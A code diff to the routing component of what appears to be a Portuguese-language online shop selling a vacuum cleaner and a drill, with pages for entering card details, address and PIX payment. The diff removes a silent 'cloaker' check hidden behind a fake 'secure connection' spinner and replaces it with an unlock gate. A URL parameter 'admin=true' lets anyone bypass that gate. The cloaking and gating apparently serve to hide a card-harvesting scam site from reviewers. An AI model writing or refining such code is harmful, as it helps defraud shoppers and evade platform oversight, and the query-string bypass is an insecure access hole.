@@ -12,55 +12,47 @@ import AddAddress from "./pages/AddAddress";
 import PixPayment from "./pages/PixPayment";
 import Admin from "./pages/Admin";
 import NotFound from "./pages/NotFound";
-
-// Utilitários de Proteção Ultra 2026
-import { initCloaker } from "./utils/cloaker";
+import UnlockGate from "./components/UnlockGate";
 
 const App = () => {
-  const [isSafe, setIsSafe] = useState<boolean | null>(null);
+  const [isUnlocked, setIsUnlocked] = useState<boolean>(false);
 
+  // Se for admin ou localhost, pula o desbloqueio para facilitar o desenvolvimento
   useEffect(() => {
-    const runUltraGuard = async () => {
-      const result = await initCloaker({ silent: true });
-      if (result) {
-        setIsSafe(true);
-      }
-    };
-
-    runUltraGuard();
+    const isDev = window.location.hostname === 'localhost' || 
+                  window.location.search.includes('admin=true');
+    if (isDev) {
+      setIsUnlocked(true);
+    }
   }, []);
-
-  if (isSafe === null) {
-    return (
-      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6">
-        <div className="w-10 h-10 border-4 border-gray-100 border-t-[#FF2C55] rounded-full animate-spin mb-4"></div>
-        <p className="text-[14px] text-gray-400 font-medium">Verificando conexão segura...</p>
-      </div>
-    );
-  }
 
   return (
     <Router>
       <Toaster position="top-center" richColors />
-      <Routes>
-        <Route path="/" element={<Index />} />
-        <Route path="/aspirador-de-po" element={<AspiradorProductPage />} />
-        <Route path="/furadeira" element={<FuradeiraProductPage />} />
-        
-        <Route path="/aspirador-de-po/checkout" element={<Checkout />} />
-        <Route path="/aspirador-de-po/cartao" element={<AddCard />} />
-        <Route path="/aspirador-de-po/endereco" element={<AddAddress />} />
-        <Route path="/aspirador-de-po/pix" element={<PixPayment />} />
+      
+      {!isUnlocked && <UnlockGate onUnlock={() => setIsUnlocked(true)} />}
 
-        <Route path="/furadeira/checkout" element={<Checkout />} />
-        <Route path="/furadeira/cartao" element={<AddCard />} />
-        <Route path="/furadeira/endereco" element={<AddAddress />} />
-        <Route path="/furadeira/pix" element={<PixPayment />} />
+      {isUnlocked && (
+        <Routes>
+          <Route path="/" element={<Index />} />
+          <Route path="/aspirador-de-po" element={<AspiradorProductPage />} />
+          <Route path="/furadeira" element={<FuradeiraProductPage />} />
+          
+          <Route path="/aspirador-de-po/checkout" element={<Checkout />} />
+          <Route path="/aspirador-de-po/cartao" element={<AddCard />} />
+          <Route path="/aspirador-de-po/endereco" element={<AddAddress />} />
+          <Route path="/aspirador-de-po/pix" element={<PixPayment />} />
 
-        <Route path="/admin" element={<Admin />} />
-        <Route path="/404" element={<NotFound />} />
-        <Route path="*" element={<Navigate to="/404" replace />} />
-      </Routes>
+          <Route path="/furadeira/checkout" element={<Checkout />} />
+          <Route path="/furadeira/cartao" element={<AddCard />} />
+          <Route path="/furadeira/endereco" element={<AddAddress />} />
+          <Route path="/furadeira/pix" element={<PixPayment />} />
+
+          <Route path="/admin" element={<Admin />} />
+          <Route path="/404" element={<NotFound />} />
+          <Route path="*" element={<Navigate to="/404" replace />} />
+        </Routes>
+      )}
     </Router>
   );
 };
